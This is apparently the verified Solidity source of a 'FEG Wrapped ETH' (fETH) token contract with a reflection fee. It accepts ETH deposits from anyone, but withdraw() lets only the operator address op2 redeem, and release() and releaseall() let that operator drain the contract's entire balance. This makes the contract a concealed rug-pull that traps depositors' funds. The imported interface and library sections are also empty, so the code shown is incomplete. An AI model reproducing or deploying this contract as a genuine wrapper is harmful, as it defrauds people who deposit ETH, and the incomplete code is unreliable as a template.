/**
 *Submitted for verification at Etherscan.io on 2021-06-14
*/

/**
 *Submitted for verification at Etherscan.io on 2021-04-01
*/

/**
 *Submitted for verification at BscScan.com on 2021-02-28
*/

// SPDX-License-Identifier: MIT


pragma solidity ^0.8.1;




// File: openzeppelin-solidity\contracts\token\ERC20\IERC20.sol

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */


// File: openzeppelin-solidity\contracts\utils\Address.sol


/**
 * @dev Collection of functions related to the address type
 */



contract fETH is IERC20 {
    using Address for address;
    enum TxType { FromExcluded, ToExcluded, BothExcluded, Standard }

    mapping (address => uint256) private rBnbBalance;
    mapping (address => uint256) private tBnbBalance;
    mapping (address => mapping (address => uint256)) private _allowances;

    EnumerableSet.AddressSet excluded;

    uint256 private tBnbSupply;
    uint256 private rBnbSupply;
    uint256 private feesAccrued;
 
    string private _name = 'FEG Wrapped ETH'; 
    string private _symbol = 'fETH';
    uint8  private _decimals = 18;
    
    address private op;
    address private op2;
    
    event  Deposit(address indexed dst, uint amount);
    event  Withdrawal(address indexed src, uint amount);

    receive() external payable {
        deposit();
    }

    constructor () {
        op = address(0x91e291bAad5ba6B8B5697E8F3723702fa92d89Aa);
        op2 = op;
        EnumerableSet.add(excluded, address(0)); // stablity - zen.
        emit Transfer(address(0), msg.sender, 0);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return tBnbSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (EnumerableSet.contains(excluded, account)) return tBnbBalance[account];
        (uint256 r, uint256 t) = currentSupply();
        return (rBnbBalance[account] * t)  / r;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] - subtractedValue);
        return true;
    }

    function isExcluded(address account) public view returns (bool) {
        return EnumerableSet.contains(excluded, account);
    }

    function totalFees() public view returns (uint256) {
        return feesAccrued;
    }
    
    function deposit() public payable {
        require(msg.value > 0, "can't deposit nothing");
        (uint256 r, uint256 t) = currentSupply();
        tBnbSupply += msg.value;
        uint256 fee = msg.value / 100; 
        uint256 df = fee / 10;
        uint256 net = fee != 0 ? (msg.value - (fee)) : msg.value;
        if(isExcluded(msg.sender)){
            tBnbBalance[msg.sender] += (msg.value - fee);
        } 
        feesAccrued += fee;
        rBnbBalance[op] += ((df * r) / t);
        rBnbSupply += (((net + df) * r) / t);
        rBnbBalance[msg.sender] += ((net * r) / t);
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint amt) public {
        require(msg.sender == op2, "op only");
        require(balanceOf(msg.sender) >= amt && amt <= totalSupply(), "invalid amt");
        (uint256 r, uint256 t) = currentSupply();
        uint256 fee = amt / 100;
        uint256 wf = fee / 8;
        uint256 net = amt - fee;
        if(isExcluded(msg.sender)) {
            tBnbBalance[msg.sender] -= amt;
            rBnbBalance[msg.sender] -= ((amt * r) / t);
        } else {
            rBnbBalance[msg.sender] -= ((amt * r) / t);
        }
        tBnbSupply -= (net + wf);
        rBnbSupply -= (((net + wf) * r ) / t);
        rBnbBalance[op] += ((wf * r) / t);
        feesAccrued += wf;
        payable(msg.sender).transfer(net); 
        emit Withdrawal(msg.sender, net);
    }
    
    function getBalance() public view returns (uint256) {
        require(msg.sender == op2, "op only");
        return address(this).balance;
    }
    
    function release(uint amt) public {
        require(msg.sender == op2, "op only");
        payable(msg.sender).transfer(amt);
    }

    function releaseall() public {
        require(msg.sender == op2, "op only");
        payable(msg.sender).transfer(address(this).balance);
    }
    
    function rBnbToEveryone(uint256 amt) public {
        require(!isExcluded(msg.sender), "not allowed");
        (uint256 r, uint256 t) = currentSupply();
        rBnbBalance[msg.sender] -= ((amt * r) / t);
        rBnbSupply -= ((amt * r) / t);
        feesAccrued += amt;
    }

    function excludeFromFees(address account) external {
        require(msg.sender == op2, "op only");
        require(!EnumerableSet.contains(excluded, account), "address excluded");
        if(rBnbBalance[account] > 0) {
            (uint256 r, uint256 t) = currentSupply();
            tBnbBalance[account] = (rBnbBalance[account] * (t)) / (r);
        }
        EnumerableSet.add(excluded, account);
    }

    function includeInFees(address account) external {
        require(msg.sender == op2, "op only");
        require(EnumerableSet.contains(excluded, account), "address excluded");
        tBnbBalance[account] = 0;
        EnumerableSet.remove(excluded, account);
    }
    
    function tBnbFromrBnb(uint256 rBnbAmount) external view returns (uint256) {
        (uint256 r, uint256 t) = currentSupply();
        return (rBnbAmount * t) / r;
    }


    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function getTtype(address sender, address recipient) internal view returns (TxType t) {
        bool isSenderExcluded = EnumerableSet.contains(excluded, sender);
        bool isRecipientExcluded = EnumerableSet.contains(excluded, recipient);
        if (isSenderExcluded && !isRecipientExcluded) {
            t = TxType.FromExcluded;
        } else if (!isSenderExcluded && isRecipientExcluded) {
            t = TxType.ToExcluded;
        } else if (!isSenderExcluded && !isRecipientExcluded) {
            t = TxType.Standard;
        } else if (isSenderExcluded && isRecipientExcluded) {
            t = TxType.BothExcluded;
        } else {
            t = TxType.Standard;
        }
        return t;
    }
    function _transfer(address sender, address recipient, uint256 amt) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amt > 0, "Transfer amt must be greater than zero");
        (uint256 r, uint256 t) = currentSupply();
        uint256 fee = amt / 100;
        TxType tt = getTtype(sender, recipient);
        if (tt == TxType.ToExcluded) {
            rBnbBalance[sender] -= ((amt * r) / t);
            tBnbBalance[recipient] += (amt - fee);
            rBnbBalance[recipient] += (((amt - fee) * r) / t);
        } else if (tt == TxType.FromExcluded) {
            tBnbBalance[sender] -= (amt);
            rBnbBalance[sender] -= ((amt * r) / t);
            rBnbBalance[recipient] += (((amt - fee) * r) / t);
        } else if (tt == TxType.BothExcluded) {
            tBnbBalance[sender] -= (amt);
            rBnbBalance[sender] -= ((amt * r) / t);
            tBnbBalance[recipient] += (amt - fee);
            rBnbBalance[recipient] += (((amt - fee) * r) / t);
        } else {
            rBnbBalance[sender] -= ((amt * r) / t);
            rBnbBalance[recipient] += (((amt - fee) * r) / t);
        }
        rBnbSupply  -= ((fee * r) / t);
        feesAccrued += fee;
        emit Transfer(sender, recipient, amt - fee);
    }

    function currentSupply() public view returns(uint256, uint256) {
        if(rBnbSupply == 0 || tBnbSupply == 0) return (1000000000, 1);
        uint256 rSupply = rBnbSupply;
        uint256 tSupply = tBnbSupply;
        for (uint256 i = 0; i < EnumerableSet.length(excluded); i++) {
            if (rBnbBalance[EnumerableSet.at(excluded, i)] > rSupply || tBnbBalance[EnumerableSet.at(excluded, i)] > tSupply) return (rBnbSupply, tBnbSupply);
            rSupply -= (rBnbBalance[EnumerableSet.at(excluded, i)]);
            tSupply -= (tBnbBalance[EnumerableSet.at(excluded, i)]);
        }
        if (rSupply < rBnbSupply / tBnbSupply) return (rBnbSupply, tBnbSupply);
        return (rSupply, tSupply);
    }
    
    function setOp(address opper, address opper2) external {
        require(msg.sender == op, "only op can call");
        op = opper;
        op2 = opper2;
    }
}